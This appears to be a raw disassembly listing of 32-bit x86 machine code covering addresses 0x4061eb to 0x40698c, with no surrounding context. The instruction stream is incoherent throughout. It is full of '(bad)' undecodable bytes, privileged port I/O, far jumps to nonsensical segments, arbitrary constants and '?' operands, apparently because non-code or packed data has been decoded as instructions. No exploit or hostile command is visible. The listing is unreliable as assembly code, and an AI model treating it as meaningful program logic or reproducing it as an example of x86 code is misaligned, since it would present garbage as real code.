  4061eb:	add    cl,BYTE PTR [eax]
  4061ed:	adc    DWORD PTR [ebp+0x564ca275],edi
  4061f3:	inc    eax
  4061f4:	mov    ch,0xbf
  4061f6:	in     eax,dx
  4061f7:	push   cs
  4061f8:	cmp    eax,0x26f793c8
  4061fd:	mov    eax,ds:0x6ddd5df4
  406202:	or     eax,0x9bc4c13e
  406207:	adc    cl,bh
  406209:	ror    BYTE PTR [edi+0x291490e6],cl
  40620f:	sub    al,0x80
  406211:	adc    BYTE PTR [ebx+0x1f],dh
  406214:	and    DWORD PTR [edi],esi
  406216:	aam    0x9b
  406218:	pop    esp
  406219:	xchg   edi,eax
  40621a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40621b:	(bad)  
  40621c:	xchg   DWORD PTR [edi+esi*2],edi
  40621f:	jno    0x40629c
  406221:	push   es
  406222:	and    bh,BYTE PTR [ecx+0x538d915e]
  406228:	scas   eax,DWORD PTR es:[edi]
  406229:	xor    al,0x88
  40622b:	out    dx,eax
  40622c:	sub    al,0xaf
  40622e:	scas   al,BYTE PTR es:[edi]
  40622f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406230:	adc    eax,0xab4f9b45
  406235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406236:	push   ds
  406237:	add    al,BYTE PTR [ecx-0x1f62e51e]
  40623d:	outs   dx,BYTE PTR ds:[esi]
  40623e:	fcomp  DWORD PTR [edi]
  406240:	out    0x4b,al
  406242:	mov    bh,0x59
  406244:	xchg   esp,eax
  406245:	mov    dl,0xd
  406247:	mov    ebx,0x76c2e74e
  40624c:	dec    esp
  40624d:	xor    DWORD PTR [ebx-0x34],0x57b5a7e8
  406254:	pop    eax
  406255:	pop    esi
  406256:	push   esp
  406257:	jle    0x406294
  406259:	popf   
  40625a:	pop    esi
  40625b:	dec    esp
  40625c:	repnz iret 
  40625e:	stos   BYTE PTR es:[edi],al
  40625f:	or     BYTE PTR [edi-0x1234ea72],dl
  406265:	fbld   TBYTE PTR [esi-0x51]
  406268:	test   eax,0xebebcbda
  40626d:	inc    esp
  40626e:	xlat   BYTE PTR ds:[ebx]
  40626f:	mov    ebp,0x74376e2b
  406274:	fdiv   QWORD PTR [esi-0xb]
  406277:	mov    ds:0x4d4c440c,eax
  40627c:	mov    ch,0xec
  40627e:	in     eax,dx
  40627f:	xor    DWORD PTR [ecx+0x5b443c20],ecx
  406285:	push   ss
  406286:	cmp    ebx,DWORD PTR [esi+0x79]
  406289:	(bad)  
  40628a:	ja     0x40625f
  40628c:	inc    eax
  40628d:	(bad)  
  40628e:	scas   eax,DWORD PTR es:[edi]
  40628f:	fldenv [edx-0x7f]
  406292:	imul   BYTE PTR [ecx+0xb]
  406295:	int3   
  406296:	push   ds
  406297:	xor    ah,ch
  406299:	pop    ebp
  40629a:	(bad)  
  40629b:	hlt    
  40629c:	test   ecx,esi
  40629e:	in     eax,0x41
  4062a0:	in     al,0xba
  4062a2:	aam    0x26
  4062a4:	mov    cl,0x83
  4062a6:	out    dx,al
  4062a7:	ret    
  4062a8:	xor    BYTE PTR [edi+0x68c7cef7],dh
  4062ae:	and    al,0x3a
  4062b0:	jle    0x40628f
  4062b2:	sub    edi,eax
  4062b4:	test   eax,0x4924c58
  4062b9:	sub    ch,BYTE PTR [ebp-0x346c81fa]
  4062bf:	mov    ch,0x6d
  4062c1:	test   eax,0x25ddf9ab
  4062c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062c7:	xchg   edi,eax
  4062c8:	std    
  4062c9:	mul    BYTE PTR [edx-0x15]
  4062cc:	add    esi,DWORD PTR [ebx+0x6b]
  4062cf:	daa    
  4062d0:	lods   al,BYTE PTR ds:[esi]
  4062d1:	arpl   WORD PTR [ebx-0x1f7d2027],bx
  4062d7:	sahf   
  4062d8:	aad    0x57
  4062da:	call   0xd5669789
  4062df:	rol    DWORD PTR [ebp+ebp*1+0x61b1240e],0x21
  4062e7:	fstp   DWORD PTR [edi+0x5a]
  4062ea:	scas   eax,DWORD PTR es:[edi]
  4062eb:	sbb    al,0x66
  4062ed:	inc    esp
  4062ee:	add    al,0x65
  4062f0:	xchg   ecx,eax
  4062f1:	ret    
  4062f2:	rcr    ebx,0x18
  4062f5:	in     al,0x33
  4062f7:	loope  0x4062b4
  4062f9:	sbb    DWORD PTR [ebp+0x16fa49eb],ebp
  4062ff:	in     eax,0x64
  406301:	(bad)  
  406302:	cmc    
  406303:	ror    DWORD PTR [edi+eiz*2],cl
  406306:	jno    0x4062d2
  406308:	repz cmp al,bl
  40630b:	pop    edi
  40630c:	mov    al,BYTE PTR [edx+eax*1+0x6]
  406310:	mov    ah,0xb4
  406312:	das    
  406313:	cs test ecx,edi
  406316:	mov    edx,0x3c0bf788
  40631b:	ins    DWORD PTR es:[edi],dx
  40631c:	retf   0x62b8
  40631f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406320:	and    eax,0x3738e5c3
  406325:	jp     0x406395
  406327:	xchg   ecx,eax
  406328:	jmp    0xaec42cc6
  40632d:	fnsave [eax-0x40]
  406330:	sbb    eax,esp
  406332:	lahf   
  406333:	gs into 
  406335:	push   cs
  406336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406337:	outs   dx,DWORD PTR ds:[esi]
  406338:	push   es
  406339:	int    0x5c
  40633b:	dec    ebp
  40633c:	fidivr WORD PTR [edx-0x1e76e2a7]
  406342:	test   al,0x1c
  406344:	cwde   
  406345:	stos   DWORD PTR es:[edi],eax
  406346:	fimul  DWORD PTR [ecx]
  406348:	mov    dh,0xb9
  40634a:	mov    cl,0xed
  40634c:	mov    dh,BYTE PTR [esp+eiz*2-0x4c]
  406350:	xor    ah,BYTE PTR [esi]
  406352:	loop   0x406399
  406354:	loop   0x406324
  406356:	mov    edi,0x40d0e2cc
  40635b:	sub    al,0xf4
  40635d:	out    dx,eax
  40635e:	sbb    ax,0x8b9b
  406362:	mov    esp,0xd95b51b7
  406367:	bound  ebp,QWORD PTR [edi]
  406369:	inc    ecx
  40636a:	aas    
  40636b:	sbb    eax,0x23099048
  406370:	(bad)  
  406372:	mov    edx,0x9addef14
  406377:	in     al,0x6f
  406379:	cs add al,0x9f
  40637c:	mov    esi,0x601e3c1
  406381:	outs   dx,DWORD PTR ds:[esi]
  406382:	pop    esp
  406383:	sub    BYTE PTR [eax-0xf1097f4],0x92
  40638a:	cli    
  40638b:	sbb    dh,dh
  40638d:	fwait
  40638e:	arpl   cx,dx
  406390:	inc    edi
  406391:	add    ebx,DWORD PTR [eax]
  406393:	sub    al,0xa5
  406395:	fld    DWORD PTR [edx]
  406397:	ins    DWORD PTR es:[edi],dx
  406398:	mov    ebp,0xf54e3268
  40639d:	ins    DWORD PTR es:[edi],dx
  40639e:	fisttp WORD PTR gs:[esi]
  4063a1:	and    esi,DWORD PTR [eax]
  4063a3:	adc    eax,DWORD PTR [edi+0x583e1032]
  4063a9:	pusha  
  4063aa:	rcl    BYTE PTR [ecx+ebx*2+0x1c],0x72
  4063af:	cmp    al,0x6
  4063b1:	jnp    0x4063b5
  4063b3:	out    0x2d,al
  4063b5:	pop    edi
  4063b6:	fbstp  TBYTE PTR [ecx-0x6b]
  4063b9:	imul   ecx,DWORD PTR [esi+0x21],0x46a63b13
  4063c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063c1:	or     edi,ebp
  4063c3:	pop    es
  4063c4:	inc    esi
  4063c5:	fidiv  WORD PTR [edi-0x6f]
  4063c8:	fistp  DWORD PTR [edi+0x1df60e3a]
  4063ce:	into   
  4063cf:	adc    ah,dh
  4063d1:	xor    eax,0xcc5663a9
  4063d6:	mov    eax,0x747c3026
  4063db:	mov    dl,0xca
  4063dd:	mov    edx,DWORD PTR [esi+0x3858ab6e]
  4063e3:	push   ebx
  4063e4:	pop    edi
  4063e5:	int3   
  4063e6:	cs out dx,eax
  4063e8:	sbb    dl,BYTE PTR [esi-0x7d]
  4063eb:	pop    ebx
  4063ec:	mov    eax,0x9f730c3c
  4063f1:	mul    BYTE PTR [esi*2+0x71aa45ca]
  4063f8:	mov    esi,DWORD PTR [esi+0x7]
  4063fb:	test   BYTE PTR [ecx],bh
  4063fd:	lods   eax,DWORD PTR ds:[esi]
  4063fe:	in     eax,0x8
  406400:	out    dx,al
  406401:	fsubp  st(0),st
  406403:	jns    0x406458
  406405:	(bad)
  406408:	mov    ds:0x7aaa2501,eax
  40640d:	(bad)  
  40640e:	cmp    BYTE PTR [ebp-0x6e],ah
  406411:	push   ebx
  406412:	jno    0x4063e2
  406414:	mov    ds:0xb0df3a77,eax
  406419:	js     0x406480
  40641b:	adc    dl,bh
  40641d:	ror    BYTE PTR [ecx-0x54f0f033],1
  406423:	cli    
  406424:	rol    esi,0x7
  406427:	sahf   
  406428:	or     DWORD PTR [ebx+0x47],ecx
  40642b:	mov    bl,0xf7
  40642d:	xchg   esi,eax
  40642e:	adc    al,BYTE PTR [esi-0x5e]
  406431:	fwait
  406432:	daa    
  406433:	mov    cs,esp
  406435:	mov    edx,0xf9e07fc1
  40643a:	push   edx
  40643b:	ss retf 0xa027
  40643f:	jo     0x4063ea
  406441:	ss stos DWORD PTR es:[edi],eax
  406443:	repnz imul ebx,DWORD PTR [esi+0x1c],0xfffffffe
  406448:	push   edi
  406449:	and    eax,0x84144315
  40644e:	arpl   WORD PTR [ebx+0x45],bp
  406451:	dec    edx
  406452:	ja     0x4064ad
  406454:	pop    edi
  406455:	int3   
  406456:	inc    ebp
  406457:	mov    esi,0xdd5169d4
  40645c:	sub    ch,BYTE PTR [edi]
  40645e:	popf   
  40645f:	(bad)  
  406460:	(bad)  
  406461:	xor    eax,0xed293916
  406466:	loopne 0x4064cf
  406468:	mov    al,ds:0xe6e1077
  40646d:	mov    ch,0x3f
  40646f:	or     eax,0x39fe43c8
  406474:	out    dx,al
  406475:	sub    edx,eax
  406477:	aam    0xb
  406479:	and    BYTE PTR [esi-0x7ced55d4],dl
  40647f:	aas    
  406480:	repz imul eax,DWORD PTR [ebx-0x7c83e732],0x39942cfa
  40648b:	push   es
  40648c:	or     eax,0xb59eb966
  406491:	adc    BYTE PTR [ebx],bh
  406493:	out    0xe9,al
  406495:	or     cl,BYTE PTR [ecx-0x108e182f]
  40649b:	(bad)  
  40649c:	cs mov ecx,edi
  40649f:	xchg   esp,eax
  4064a0:	loop   0x4064ff
  4064a2:	ret    
  4064a3:	sbb    DWORD PTR [edi-0x71],ecx
  4064a6:	loopne 0x406469
  4064a8:	dec    ebp
  4064a9:	loop   0x4064a8
  4064ab:	test   al,0xb2
  4064ad:	jmp    0x3347:0x122fac4e
  4064b4:	sbb    al,0x98
  4064b6:	nop
  4064b7:	xchg   edi,eax
  4064b8:	push   edi
  4064b9:	sub    eax,0x575f2a98
  4064be:	push   ebx
  4064bf:	push   ecx
  4064c0:	retf   0xafb8
  4064c3:	push   0xffffffbe
  4064c5:	and    edx,DWORD PTR [edi+edx*1+0x41a75ac6]
  4064cc:	push   es
  4064cd:	push   esp
  4064ce:	inc    ecx
  4064cf:	push   esp
  4064d0:	pushf  
  4064d1:	mov    WORD PTR [edi-0x3d],?
  4064d4:	jb     0x406521
  4064d6:	jns    0x4064a4
  4064d8:	lods   al,BYTE PTR ds:[esi]
  4064d9:	pop    ss
  4064da:	xchg   edx,eax
  4064db:	xchg   esp,eax
  4064dc:	xchg   ebx,eax
  4064dd:	scas   al,BYTE PTR es:[edi]
  4064de:	jle    0x4064ee
  4064e0:	popf   
  4064e1:	dec    esp
  4064e2:	fistp  WORD PTR [ebp+eiz*2+0x25]
  4064e6:	mov    edi,0x72242e94
  4064eb:	or     ecx,ebx
  4064ed:	inc    eax
  4064ee:	mov    ch,0x74
  4064f0:	jle    0x406490
  4064f2:	fldenv [ebx-0x23fb7de1]
  4064f8:	pop    eax
  4064f9:	mov    ah,0xfc
  4064fb:	hlt    
  4064fc:	sbb    DWORD PTR [ebx+0x61],esi
  4064ff:	ficomp WORD PTR [ecx]
  406501:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406502:	pop    ebx
  406503:	mov    dh,0x4a
  406505:	pop    esi
  406506:	push   esp
  406507:	inc    edi
  406508:	adc    ebx,ebp
  40650a:	nop
  40650b:	jnp    0x406581
  40650d:	lods   eax,DWORD PTR ds:[esi]
  40650e:	push   ds
  40650f:	stc    
  406510:	bound  esi,QWORD PTR [ebx+0x68f63185]
  406516:	mov    ds:0xf19d19b8,eax
  40651b:	inc    esi
  40651c:	sti    
  40651d:	cmp    al,0x3f
  40651f:	iret   
  406520:	adc    eax,0xeebe6043
  406525:	mov    ds:0x65826b7,eax
  40652a:	xor    ch,BYTE PTR [esi-0x6d8762]
  406530:	xchg   edx,eax
  406531:	int3   
  406532:	mov    ch,0x28
  406534:	outs   dx,DWORD PTR ds:[esi]
  406535:	retf   
  406536:	and    eax,0xcfa38ef2
  40653b:	sbb    al,0x73
  40653d:	fnstsw WORD PTR [ebx*8+0x71d0624]
  406544:	sub    bh,BYTE PTR [ebx+0x7]
  406547:	and    DWORD PTR [esi],edi
  406549:	pop    ds
  40654a:	inc    ecx
  40654b:	jmp    0x406549
  40654d:	(bad)  
  40654e:	std    
  40654f:	push   ebp
  406550:	sub    cl,BYTE PTR [ecx]
  406552:	sbb    al,0x11
  406554:	sbb    esp,edx
  406556:	add    BYTE PTR [esi+0x600af9ad],bl
  40655c:	adc    eax,0x7cc1cd3
  406561:	pop    edi
  406562:	mov    ds:0xe4c38f14,al
  406567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406568:	xchg   edi,eax
  406569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40656a:	in     eax,0x57
  40656c:	nop
  40656d:	jle    0x40654d
  40656f:	pop    ss
  406570:	pop    ebp
  406571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406572:	inc    edi
  406573:	inc    ebx
  406574:	stos   BYTE PTR es:[edi],al
  406575:	(bad)  
  406576:	hlt    
  406577:	das    
  406578:	mov    al,ds:0x81d0bb42
  40657d:	das    
  40657e:	or     edi,esi
  406580:	cmc    
  406581:	fstp   QWORD PTR [edi]
  406583:	or     ecx,DWORD PTR [edx+0x6bb930ba]
  406589:	and    DWORD PTR [edx+0x53891e4d],0x1a
  406590:	xchg   ecx,eax
  406591:	clc    
  406592:	sub    eax,0x63f66fd4
  406597:	imul   DWORD PTR [edi]
  406599:	inc    ebp
  40659a:	inc    esi
  40659b:	outs   dx,DWORD PTR ds:[esi]
  40659c:	rdpmc  
  40659e:	in     al,dx
  40659f:	cmp    eax,0xc400e4c
  4065a4:	(bad)  
  4065a6:	cvtps2pd xmm5,QWORD PTR [edi]
  4065a9:	dec    ecx
  4065aa:	(bad)  
  4065ab:	and    DWORD PTR [ecx-0x3c28fc05],0xfffffff8
  4065b2:	mov    ebp,0xb50be99
  4065b7:	repnz xor eax,0xd50c2406
  4065bd:	mov    eax,0xdde0af09
  4065c2:	jl     0x40658c
  4065c4:	leave  
  4065c5:	out    0x8e,eax
  4065c7:	popa   
  4065c8:	sahf   
  4065c9:	xor    DWORD PTR [edx],ebp
  4065cb:	mov    cl,0x73
  4065cd:	mov    cl,0x5a
  4065cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065d0:	mov    bh,0xf7
  4065d2:	cmp    al,0xec
  4065d4:	adc    al,0x6d
  4065d6:	dec    esi
  4065d7:	mov    ds,WORD PTR [ecx+0x41]
  4065da:	fnstenv [esi]
  4065dc:	xchg   ecx,eax
  4065dd:	in     al,0x19
  4065df:	adc    cl,bh
  4065e1:	add    eax,0x7932d5f7
  4065e6:	fcmovb st,st(6)
  4065e8:	jb     0x4065cf
  4065ea:	cwde   
  4065eb:	or     eax,0x4a1641ba
  4065f0:	mov    esi,DWORD PTR [edx]
  4065f2:	jae    0x4065db
  4065f4:	or     al,0x2
  4065f6:	sti    
  4065f7:	xlat   BYTE PTR ds:[ebx]
  4065f8:	mov    ?,WORD PTR [ecx-0x63092ddc]
  4065fe:	ss jle 0x4065ae
  406601:	inc    ebp
  406602:	mov    eax,ds:0x3d3d8eba
  406607:	lods   al,BYTE PTR ds:[esi]
  406608:	sub    al,0x26
  40660a:	fist   WORD PTR [esi+0x62]
  40660d:	sbb    DWORD PTR [ecx],edx
  40660f:	cmp    bh,0x6f
  406612:	xor    edx,ebp
  406614:	test   al,0x7f
  406616:	add    bh,0x5e
  406619:	and    al,0xfd
  40661b:	jbe    0x406605
  40661d:	xor    bh,BYTE PTR [eax-0x7b21fe58]
  406623:	push   esi
  406624:	and    BYTE PTR [eax],0xf3
  406627:	neg    dl
  406629:	mov    ebp,DWORD PTR [ecx]
  40662b:	data16 jle 0x40669f
  40662e:	jmp    0x3e85:0x3d969815
  406635:	dec    esp
  406636:	add    esi,DWORD PTR [edx-0x62]
  406639:	mov    bh,0xd7
  40663b:	inc    ebp
  40663c:	popa   
  40663d:	dec    ebp
  40663e:	sub    DWORD PTR [eax+eax*8-0x42],0xd798ddf8
  406646:	mov    ch,0x6
  406648:	sbb    al,0xbf
  40664a:	ds cmp eax,0x44975143
  406650:	or     esp,ebp
  406652:	mov    ebp,0xe5094e3f
  406657:	scas   al,BYTE PTR es:[edi]
  406658:	shr    BYTE PTR [edx+ebp*4],0xcc
  40665c:	je     0x4065e8
  40665e:	mov    esi,edx
  406660:	and    DWORD PTR [eax+0x372cfff9],ebp
  406666:	adc    DWORD PTR [edx],ecx
  406668:	scas   eax,DWORD PTR es:[edi]
  406669:	retf   0x8134
  40666c:	add    eax,0x9e9f6583
  406671:	adc    ah,BYTE PTR [eax-0x44baae21]
  406677:	test   BYTE PTR [eax-0x1e],0x1e
  40667b:	sahf   
  40667c:	sub    al,0xdc
  40667e:	addr16 lock push ecx
  406681:	popf   
  406682:	in     al,dx
  406683:	lods   al,BYTE PTR ds:[esi]
  406684:	inc    esi
  406685:	cmp    BYTE PTR [edi],0xd5
  406688:	fcomp  DWORD PTR [esi+0x1eeb01d6]
  40668e:	adc    ah,dl
  406690:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406691:	(bad)  
  406692:	jbe    0x4066d3
  406694:	dec    ebp
  406695:	inc    edi
  406696:	mov    esi,0xfeef6d48
  40669b:	shr    BYTE PTR [ebx+0x60177bcc],0xe4
  4066a2:	dec    esi
  4066a3:	mov    ebp,cs
  4066a5:	rol    BYTE PTR [eax+edx*4-0x56215fb4],0x3b
  4066ad:	jae    0x406696
  4066af:	imul   edx,edi,0xab332013
  4066b5:	cmp    bl,BYTE PTR [edx-0x56]
  4066b8:	mov    DWORD PTR [esi],edi
  4066ba:	dec    ebp
  4066bb:	(bad)
  4066bf:	cld    
  4066c0:	test   BYTE PTR [ebx-0x24],dl
  4066c3:	ret    0x9963
  4066c6:	sbb    al,0x95
  4066c8:	inc    edx
  4066c9:	or     DWORD PTR [esi+0x1b209083],esi
  4066cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066d0:	add    esp,edx
  4066d2:	rcl    DWORD PTR [edx],1
  4066d4:	lds    esi,FWORD PTR [ecx+0x50]
  4066d7:	push   edx
  4066d8:	stos   BYTE PTR es:[edi],al
  4066d9:	stos   BYTE PTR es:[edi],al
  4066da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066db:	adc    eax,DWORD PTR [ebp-0x72]
  4066de:	bswap  eax
  4066e0:	and    BYTE PTR [edi+0x78],dh
  4066e3:	pop    ebx
  4066e4:	xchg   ebp,eax
  4066e5:	fsubr  DWORD PTR [eiz*2+0x16d87324]
  4066ec:	pushf  
  4066ed:	shr    DWORD PTR [ecx+0x21],cl
  4066f0:	jl     0x406685
  4066f2:	pop    ecx
  4066f3:	sbb    al,0x30
  4066f5:	or     ecx,DWORD PTR [edi+0x61]
  4066f8:	dec    esi
  4066f9:	mov    esi,0x7c11a46a
  4066fe:	test   al,0x6b
  406700:	pop    edi
  406701:	pop    ss
  406702:	xchg   DWORD PTR [eax],esi
  406704:	fist   DWORD PTR [eax]
  406706:	out    dx,eax
  406707:	loopne 0x4066c0
  406709:	(bad)  
  40670a:	lsl    edx,WORD PTR [eax-0x75]
  40670e:	pop    esi
  40670f:	sub    eax,0xe7085a7d
  406714:	xchg   ebx,eax
  406715:	xchg   BYTE PTR [edi],cl
  406717:	mov    dl,0x55
  406719:	push   edi
  40671a:	jns    0x40674b
  40671c:	dec    eax
  40671d:	(bad)  
  40671e:	mov    ah,bh
  406720:	add    edi,DWORD PTR [eax+0x12e773c1]
  406726:	ins    DWORD PTR es:[edi],dx
  406727:	xor    BYTE PTR [esi+edi*8+0x79b29475],dl
  40672e:	(bad)  
  40672f:	repz out dx,eax
  406731:	les    ebx,FWORD PTR [edx+0x73]
  406734:	hlt    
  406735:	mov    ds:0xd0f55666,eax
  40673a:	mov    dh,0xaf
  40673c:	dec    esp
  40673d:	fsub   DWORD PTR [ebx+ebp*2]
  406740:	mov    ebp,edx
  406742:	jecxz  0x406786
  406744:	sub    esp,DWORD PTR [edi]
  406746:	push   es
  406747:	push   eax
  406748:	adc    eax,0x15f585b1
  40674d:	icebp  
  40674e:	or     eax,0x4ccbd3a2
  406753:	clc    
  406754:	idiv   ah
  406756:	adc    al,0x7c
  406758:	lds    ebx,FWORD PTR ds:0xc3c5a4a2
  40675e:	cmp    eax,0xcfe0560c
  406763:	push   esp
  406764:	les    ecx,FWORD PTR [ecx-0x45e9235e]
  40676a:	inc    edx
  40676b:	into   
  40676c:	xlat   BYTE PTR ds:[ebx]
  40676d:	push   0xa2aaed97
  406772:	(bad)  
  406773:	xor    eax,0x3759426e
  406778:	ror    BYTE PTR [ecx],cl
  40677a:	loop   0x406776
  40677c:	mov    al,0x61
  40677e:	cld    
  40677f:	jns    0x40670a
  406781:	mov    cl,0xaa
  406783:	test   DWORD PTR [edi],esp
  406785:	das    
  406786:	or     al,0x64
  406788:	ins    BYTE PTR es:[edi],dx
  406789:	aas    
  40678a:	push   ss
  40678b:	add    bl,BYTE PTR [eax-0x703d1204]
  406791:	aam    0x25
  406793:	(bad)  
  406795:	jne    0x4067de
  406797:	push   es
  406798:	xor    eax,0xaebe1400
  40679d:	adc    al,0x10
  40679f:	mov    ebx,0x6aca75e
  4067a4:	pop    ds
  4067a5:	or     eax,0xe43cd0a1
  4067aa:	scas   al,BYTE PTR es:[edi]
  4067ab:	sbb    al,0xf0
  4067ad:	and    eax,0x558618e2
  4067b2:	and    eax,0xe73d1421
  4067b7:	jge    0x40676f
  4067b9:	cdq    
  4067ba:	xchg   esi,eax
  4067bb:	outs   dx,BYTE PTR ds:[esi]
  4067bc:	mov    dl,0xf0
  4067be:	out    0x9a,eax
  4067c0:	xor    al,0x9
  4067c2:	loope  0x406762
  4067c4:	mov    bh,0x83
  4067c6:	imul   edi,DWORD PTR [edx-0x49516d18],0x4149be47
  4067d0:	or     bh,BYTE PTR [eax-0x7f25197b]
  4067d6:	cmp    al,0x89
  4067d8:	int3   
  4067d9:	es push ss
  4067db:	dec    ebp
  4067dc:	popf   
  4067dd:	xor    al,0x61
  4067df:	mov    ecx,0x810557db
  4067e4:	or     ebx,esp
  4067e6:	dec    ecx
  4067e7:	in     eax,dx
  4067e8:	in     al,0x61
  4067ea:	sbb    DWORD PTR [ebx],0x5e
  4067ed:	jmp    0x406774
  4067ef:	xlat   BYTE PTR ds:[ebx]
  4067f0:	mov    dh,0xb0
  4067f2:	pop    esi
  4067f3:	xchg   esi,eax
  4067f4:	and    ah,BYTE PTR [edi+0x35]
  4067f7:	sbb    al,cl
  4067f9:	arpl   WORD PTR [edi],ax
  4067fb:	test   al,0xb
  4067fd:	mov    ds:0xd330d135,al
  406802:	aaa    
  406803:	jo     0x40686a
  406805:	mov    ecx,0xec77649c
  40680a:	adc    bl,BYTE PTR [ecx+0xf]
  40680d:	xchg   edx,eax
  40680e:	sbb    bh,BYTE PTR [eax]
  406810:	pop    edi
  406811:	jne    0x4067d4
  406813:	and    eax,0xdd4fcef0
  406818:	add    DWORD PTR [edi+0x42],edx
  40681b:	push   ebx
  40681c:	sbb    DWORD PTR [edi-0x39],eax
  40681f:	mov    bl,0xa
  406821:	and    DWORD PTR [edx],ebx
  406823:	lea    edx,[esi-0x7293dfe9]
  406829:	mov    esp,0x10691078
  40682e:	jne    0x40689a
  406830:	sub    al,0xcd
  406832:	leave  
  406833:	test   DWORD PTR [ebx+0x56d0040e],0x9e609353
  40683d:	sbb    esi,DWORD PTR [ebp-0x3f]
  406840:	cdq    
  406841:	stos   DWORD PTR es:[edi],eax
  406842:	push   ss
  406843:	xchg   esi,eax
  406844:	jmp    0x406841
  406846:	popa   
  406847:	stc    
  406848:	adc    bl,BYTE PTR [edx+0x7a]
  40684b:	aad    0xfd
  40684d:	add    DWORD PTR [eax-0x49],ebx
  406850:	repz call 0x13:0x86cf6532
  406858:	or     BYTE PTR [ecx+edx*1-0x61],bl
  40685c:	ss xor eax,0xb0ead2a8
  406862:	fdivr  DWORD PTR [ecx-0x59]
  406865:	retf   
  406866:	jg     0x406890
  406868:	dec    ebx
  406869:	int    0xb9
  40686b:	sbb    bh,BYTE PTR [eax+edx*4]
  40686e:	in     al,dx
  40686f:	pop    edx
  406870:	mov    fs,WORD PTR [ebx]
  406872:	sbb    al,0x72
  406874:	xchg   ebx,eax
  406875:	ret    
  406876:	stc    
  406877:	(bad)
  40687b:	mov    edi,0xf95ae10c
  406880:	xchg   DWORD PTR [edx],ecx
  406882:	sub    eax,0xf42873e2
  406887:	push   ss
  406888:	jmp    DWORD PTR [esi]
  40688a:	xchg   edx,eax
  40688b:	cmp    ah,0xf6
  40688e:	mov    edx,0x64283c6c
  406893:	fs sbb eax,0xcc1e6c06
  406899:	dec    eax
  40689a:	cld    
  40689b:	rol    DWORD PTR [esi-0x28],1
  40689e:	cmpps  xmm5,XMMWORD PTR [edx],0xdc
  4068a2:	adc    eax,0x49ffc3b7
  4068a7:	fwait
  4068a8:	scas   al,BYTE PTR es:[edi]
  4068a9:	or     al,0x54
  4068ab:	push   esi
  4068ac:	out    dx,eax
  4068ad:	inc    ebx
  4068ae:	adc    BYTE PTR [ebx+0x78bcd3dc],bh
  4068b4:	scas   al,BYTE PTR es:[edi]
  4068b5:	pop    ebx
  4068b6:	mov    cl,0x7
  4068b8:	and    eax,DWORD PTR [ecx+0x28232386]
  4068be:	nop
  4068bf:	xlat   BYTE PTR ds:[ebx]
  4068c0:	xchg   edi,eax
  4068c1:	lock mov edi,0xd78a68c4
  4068c7:	cmp    al,dh
  4068c9:	popf   
  4068ca:	or     BYTE PTR [edi-0x33],bh
  4068cd:	sub    dl,BYTE PTR [esi]
  4068cf:	jle    0x4068a5
  4068d1:	dec    ebp
  4068d2:	push   0xffffff8d
  4068d4:	daa    
  4068d5:	xchg   DWORD PTR [ebx+0x4e],ebx
  4068d8:	cwde   
  4068d9:	xchg   edi,eax
  4068da:	test   BYTE PTR [edx+ecx*8-0x69926b],bh
  4068e1:	adc    eax,0x8b45d7cd
  4068e6:	and    DWORD PTR [edx],ecx
  4068e8:	call   0x2fe2c773
  4068ed:	push   esp
  4068ee:	bound  edx,QWORD PTR [edi+0x244fb43f]
  4068f4:	dec    esi
  4068f5:	adc    eax,0x7a42a7c0
  4068fa:	xchg   ebx,eax
  4068fb:	mov    ebx,edi
  4068fd:	mov    ah,0x9
  4068ff:	sbb    al,BYTE PTR [edx]
  406901:	dec    esp
  406902:	xchg   DWORD PTR [eax+0x21],ecx
  406905:	pop    ebx
  406906:	ja     0x406931
  406908:	pop    ebp
  406909:	ins    DWORD PTR es:[edi],dx
  40690a:	ja     0x406955
  40690c:	push   ss
  40690d:	mov    ebp,0x95fdcfb2
  406912:	xchg   ecx,eax
  406913:	mov    ch,0x19
  406915:	pop    eax
  406916:	xchg   esi,eax
  406917:	aam    0xe6
  406919:	cmp    al,0x26
  40691b:	add    BYTE PTR [ebx+0x714b3fd8],bl
  406921:	dec    ecx
  406922:	stos   DWORD PTR es:[edi],eax
  406923:	sti    
  406924:	mov    BYTE PTR [ebx],ah
  406926:	or     al,0xd3
  406928:	ins    BYTE PTR es:[edi],dx
  406929:	lea    edi,[eax+0x2d039f6f]
  40692f:	push   ebx
  406930:	inc    eax
  406931:	test   DWORD PTR [ebp+edi*2+0x46],esi
  406935:	imul   ebx,DWORD PTR [ebp+0x2d],0xbca4e873
  40693c:	stc    
  40693d:	and    eax,0xa481cbd2
  406942:	in     al,0x6e
  406944:	out    dx,al
  406945:	mov    dh,0x43
  406947:	xor    ah,BYTE PTR [eax+edx*8]
  40694a:	data16 jo 0x406902
  40694d:	daa    
  40694e:	iret   
  40694f:	xchg   edi,esi
  406951:	sub    al,0xb3
  406953:	jbe    0x406944
  406955:	test   DWORD PTR [eax],esp
  406957:	xchg   edi,eax
  406958:	int    0x51
  40695a:	mov    WORD PTR [ecx-0x62],cs
  40695d:	aaa    
  40695e:	out    0xa6,eax
  406960:	aad    0x27
  406962:	adc    BYTE PTR [ebp-0x30],0xf9
  406966:	fsubp  st(3),st
  406968:	in     al,dx
  406969:	in     eax,dx
  40696a:	fstp   TBYTE PTR [edx]
  40696c:	pusha  
  40696d:	inc    edi
  40696e:	inc    esp
  40696f:	pop    DWORD PTR [esi+0x72]
  406972:	jbe    0x406927
  406974:	out    dx,eax
  406975:	jae    0x40699a
  406977:	or     eax,0x4ddc172d
  40697c:	jno    0x4069d7
  40697e:	adc    BYTE PTR [ecx+0x4f],bh
  406981:	push   esi
  406982:	out    dx,al
  406983:	data16 mov ah,dh
  406986:	jg     0x4069ca
  406988:	add    ch,BYTE PTR [edx+edi*4-0x1c]
  40698c:	mov    cl,0xed
